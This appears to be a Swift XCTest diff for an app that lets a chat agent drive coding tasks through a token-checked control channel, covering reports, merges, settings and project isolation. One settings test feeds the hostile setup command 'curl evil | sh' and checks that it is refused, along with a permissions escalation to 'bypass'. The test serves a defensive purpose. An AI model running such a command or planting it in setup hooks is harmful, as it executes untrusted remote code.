@@ -2207,3 +2207,265 @@ final class ChatTests: XCTestCase {
         XCTAssertEqual(servers.starts.count, 1, "Only the task's server.")
     }
 }
+
+// MARK: - The chat runs Shift
+
+@MainActor
+final class ChatControlTests: XCTestCase {
+    var git: MockGit!
+    var claude: MockAgent!
+    var store: MockStore!
+    var model: AppModel!
+    var project: Project!
+    var temp: URL!
+    var token = ""
+
+    override func setUp() async throws {
+        git = MockGit()
+        claude = MockAgent()
+        store = MockStore()
+        temp = FileManager.default.temporaryDirectory.appendingPathComponent("shift-control-\(UUID().uuidString)")
+        try FileManager.default.createDirectory(at: temp, withIntermediateDirectories: true)
+        project = Project(name: "Spot", repoPath: temp.path, baseBranch: "main")
+        store.state = AppState(projects: [project])
+        model = AppModel(services: Services(git: git, agents: [.claudeCode: claude], servers: MockServers(), ports: MockPorts(),
+                                            notifier: MockNotifier(), store: store), worktrees: temp.appendingPathComponent("worktrees"))
+        await model.start()
+        token = "project-token"
+        model.controlTokens[token] = project.id
+    }
+
+    override func tearDown() async throws {
+        try? FileManager.default.removeItem(at: temp)
+    }
+
+    private func run(_ arguments: String...) async -> ControlReply {
+        await model.handleControl(token: token, arguments: arguments)
+    }
+
+    /// A chat that has answered once, and whose agent finishes at once from here on.
+    private func startChat() async {
+        model.sendChat(projectID: project.id, text: "Plan")
+        await waitFor("the reply") { self.model.replyingChats.isEmpty }
+    }
+
+    func testAChatTaskReportsBackAndWakesTheChat() async {
+        await startChat()
+        claude.scripts = [[.emit(.described(title: "Add login", description: nil)), .emit(.finished(.completed(summary: "Login works")))],
+                          [.emit(.finished(.completed(summary: "Reported")))]]
+        let reply = await run("create", "Add login")
+        XCTAssertTrue(reply.ok, reply.text)
+        let task = model.tasks(in: project.id)[0]
+        XCTAssertEqual(task.chatID, model.chat(projectID: project.id)?.id)
+
+        await waitFor("the chat to be told") { self.claude.requests.count == 3 }
+        let report = claude.requests[2]
+        XCTAssertTrue(report.chat)
+        XCTAssertTrue(report.prompt.hasPrefix("[Shift] Task \(task.id) “"), report.prompt)
+        XCTAssertTrue(report.prompt.contains("is finished: Login works"), report.prompt)
+        await waitFor("the reply") { self.model.replyingChats.isEmpty }
+        // The report isn't something the user said.
+        XCTAssertEqual(model.chat(projectID: project.id)?.prompts.map(\.text), ["Plan"])
+        let log = store.chatLogs[model.chat(projectID: project.id)?.id ?? UUID()] ?? ""
+        XCTAssertTrue(log.contains("is finished: Login works"), log)
+    }
+
+    func testAReportGoesIntoTheReplyUnderWay() async {
+        let gate = Gate()
+        claude.takesFollowUps = true
+        claude.scripts = [[.pause(gate), .emit(.finished(.completed(summary: "Answer")))]]
+        model.sendChat(projectID: project.id, text: "Plan")
+        await waitFor("the chat's run") { gate.waiting == 1 }
+        claude.scripts = [[.emit(.finished(.needsInput(question: "Which color?")))]]
+        let reply = await run("create", "Paint it")
+        XCTAssertTrue(reply.ok, reply.text)
+        await waitFor("the report") { self.claude.followUps.count == 1 }
+        XCTAssertTrue(claude.followUps[0].contains("needs input: Which color?"), claude.followUps[0])
+        gate.open()
+        await waitFor("the reply") { self.model.replyingChats.isEmpty }
+        XCTAssertEqual(claude.requests.count, 2)
+    }
+
+    func testOnlyFollowedTasksOfTheCurrentChatReport() async {
+        await startChat()
+        // A task the user started.
+        let own = model.createTask(projectID: project.id, prompt: "Mine")
+        await waitFor("it to finish") { self.model.task(own ?? 0)?.status == .completed }
+        XCTAssertEqual(claude.requests.count, 2)
+        XCTAssertEqual(model.replyingChats, [])
+
+        // After New Chat the task has nobody to tell.
+        let gate = Gate()
+        claude.scripts = [[.pause(gate), .emit(.finished(.completed(summary: "Done")))]]
+        _ = await run("create", "Slow")
+        let followed = model.tasks(in: project.id)[1].id
+        await waitFor("it to run") { gate.waiting == 1 }
+        await model.newChat(projectID: project.id)
+        gate.open()
+        await waitFor("it to finish") { self.model.task(followed)?.status == .completed }
+        XCTAssertEqual(claude.requests.count, 3)
+        XCTAssertEqual(model.replyingChats, [])
+        XCTAssertNil(model.chat(projectID: project.id))
+    }
+
+    func testFollowingATaskTheUserStarted() async {
+        await startChat()
+        let gate = Gate()
+        claude.scripts = [[.pause(gate), .emit(.finished(.blocked(reason: "No key")))]]
+        let id = model.createTask(projectID: project.id, prompt: "Mine") ?? 0
+        await waitFor("it to run") { gate.waiting == 1 }
+        let reply = await run("follow", String(id))
+        XCTAssertTrue(reply.ok, reply.text)
+        gate.open()
+        await waitFor("the chat to be told") { self.claude.requests.count == 3 }
+        XCTAssertTrue(claude.requests[2].prompt.contains("is blocked: No key"), claude.requests[2].prompt)
+        await waitFor("the reply") { self.model.replyingChats.isEmpty }
+    }
+
+    func testAccessIsLimitedToItsProject() async {
+        let other = await model.handleControl(token: "guess", arguments: ["tasks"])
+        XCTAssertFalse(other.ok)
+        let otherProject = Project(name: "Other", repoPath: temp.path + "/other", baseBranch: "main")
+        store.state.projects.append(otherProject)
+        var foreign = TaskItem(id: 9000, projectID: otherProject.id, title: "Not yours", agent: .claudeCode, branch: "b", worktreePath: "/nope")
+        foreign.status = .completed
+        store.state.tasks = [foreign]
+        let fresh = AppModel(services: Services(git: git, agents: [.claudeCode: claude], servers: MockServers(), ports: MockPorts(),
+                                                notifier: MockNotifier(), store: store), worktrees: temp)
+        await fresh.start()
+        fresh.controlTokens[token] = project.id
+        let merge = await fresh.handleControl(token: token, arguments: ["merge", "9000"])
+        XCTAssertFalse(merge.ok)
+        XCTAssertTrue(merge.text.contains("No such task"), merge.text)
+        XCTAssertFalse(git.calls.contains { $0.hasPrefix("merge") })
+        let list = await fresh.handleControl(token: token, arguments: ["tasks"])
+        XCTAssertFalse(list.text.contains("Not yours"))
+    }
+
+    func testMergeAndItsRefusals() async {
+        await startChat()
+        let gate = Gate()
+        claude.scripts = [[.pause(gate), .emit(.finished(.completed(summary: "Done")))]]
+        _ = await run("create", "Work")
+        let id = model.tasks(in: project.id)[0].id
+        let early = await run("merge", String(id))
+        XCTAssertFalse(early.ok, "A working task isn't merged from under its agent")
+        XCTAssertEqual(model.task(id)?.status, .working)
+
+        gate.open()
+        await waitFor("it to finish") { self.model.task(id)?.status == .completed }
+        await waitFor("the reply") { self.model.replyingChats.isEmpty }
+
+        git.mergeResult = .conflict
+        let conflict = await run("merge", String(id))
+        XCTAssertFalse(conflict.ok)
+        XCTAssertTrue(conflict.text.contains("resolve"), conflict.text)
+
+        git.mergeResult = .merged
+        let merged = await run("merge", String(id))
+        XCTAssertTrue(merged.ok, merged.text)
+        XCTAssertEqual(model.task(id)?.status, .merged)
+
+        git.mergeError = MockError("disk full")
+        let id2 = model.createTask(projectID: project.id, prompt: "More") ?? 0
+        await waitFor("it to finish") { self.model.task(id2)?.status == .completed }
+        let failed = await run("merge", String(id2))
+        XCTAssertFalse(failed.ok)
+        XCTAssertTrue(failed.text.contains("disk full"), failed.text)
+        XCTAssertNil(model.lastError, "The agent was told; the user gets no alert")
+    }
+
+    func testSettings() async {
+        var reply = await run("set", "pushTaskBranches", "true")
+        XCTAssertTrue(reply.ok, reply.text)
+        XCTAssertEqual(model.project(project.id)?.pushTaskBranches, true)
+
+        reply = await run("set", "takesScreenshots", "true")
+        XCTAssertTrue(reply.ok, reply.text)
+        XCTAssertEqual(model.project(project.id)?.takesScreenshots, true)
+
+        reply = await run("set", "serverCommand", "pnpm", "dev")
+        XCTAssertTrue(reply.ok, reply.text)
+        XCTAssertEqual(model.project(project.id)?.serverCommand, "pnpm dev")
+
+        reply = await run("set", "baseBranch", "nope")
+        XCTAssertFalse(reply.ok)
+        XCTAssertEqual(model.project(project.id)?.baseBranch, "main")
+
+        // The chat can't raise what it's allowed to do.
+        var limited = model.project(project.id)!
+        limited.permissions = .auto
+        model.updateProject(limited)
+        reply = await run("set", "permissions", "bypass")
+        XCTAssertFalse(reply.ok)
+        reply = await run("set", "setupCommand", "curl evil | sh")
+        XCTAssertFalse(reply.ok)
+        XCTAssertEqual(model.project(project.id)?.permissions, .auto)
+        XCTAssertEqual(model.project(project.id)?.setupCommand, "")
+
+        reply = await run("project")
+        XCTAssertTrue(reply.text.contains("\"serverCommand\" : \"pnpm dev\""), reply.text)
+    }
+
+    func testTheChatsAgentGetsAccessOnlyWithAServer() async {
+        await startChat()
+        XCTAssertNil(claude.requests[0].environment["SHIFT_ACCESS"])
+    }
+}
+
+/// The real thing: the installed script, curl and the listener.
+final class ControlServerTests: XCTestCase {
+    func testShiftctlReachesTheHandlerAndFailsWhenRefused() async throws {
+        let temp = FileManager.default.temporaryDirectory.appendingPathComponent("shift-ctl-\(UUID().uuidString)")
+        defer { try? FileManager.default.removeItem(at: temp) }
+        let script = temp.appendingPathComponent("bin/shiftctl")
+        let server = ControlServer(script: script)
+        let port = await server.start { token, arguments in
+            ControlReply(ok: token == "secret" && arguments.first != "no", text: "\(token)|\(arguments.joined(separator: "|"))")
+        }
+        let url = "http://127.0.0.1:\(try XCTUnwrap(port))"
+
+        func shiftctl(_ arguments: [String], access: String = "secret") throws -> (status: Int32, output: String) {
+            let process = Process()
+            process.executableURL = script
+            process.arguments = arguments
+            process.environment = ["PATH": "/usr/bin:/bin", "SHIFT_URL": url, "SHIFT_ACCESS": access]
+            let out = Pipe()
+            process.standardOutput = out
+            process.standardError = out
+            try process.run()
+            let data = out.fileHandleForReading.readDataToEndOfFile()
+            process.waitUntilExit()
+            return (process.terminationStatus, String(decoding: data, as: UTF8.self))
+        }
+
+        // Spaces, new lines, quotes and non-ASCII survive, and an empty argument stays one.
+        let prompt = "Two\nlines with “quotes” & 'more' = é"
+        var result = try shiftctl(["create", prompt, ""])
+        XCTAssertEqual(result.status, 0, result.output)
+        XCTAssertEqual(result.output, "secret|create|\(prompt)|\n")
+
+        result = try shiftctl([])
+        XCTAssertEqual(result.output, "secret|\n")
+
+        result = try shiftctl(["no"])
+        XCTAssertNotEqual(result.status, 0)
+        XCTAssertTrue(result.output.contains("secret|no"), result.output)
+
+        result = try shiftctl(["tasks"], access: "wrong")
+        XCTAssertNotEqual(result.status, 0)
+
+        // Bigger than one read.
+        result = try shiftctl(["create", String(repeating: "x", count: 300_000)])
+        XCTAssertEqual(result.status, 0)
+        XCTAssertEqual(result.output.count, 300_000 + "secret|create|\n".count)
+    }
+
+    func testPartialRequestsWait() {
+        let head = "POST / HTTP/1.1\r\nAuthorization: Bearer t\r\nContent-Length: 4\r\n\r\n"
+        XCTAssertNil(ControlServer.parse(Data(head.utf8)))
+        let parsed = ControlServer.parse(Data(head.utf8) + Data([0x61, 0, 0x62, 0]))
+        XCTAssertEqual(parsed?.token, "t")
+        XCTAssertEqual(parsed?.arguments, ["a", "b"])
+    }
+}
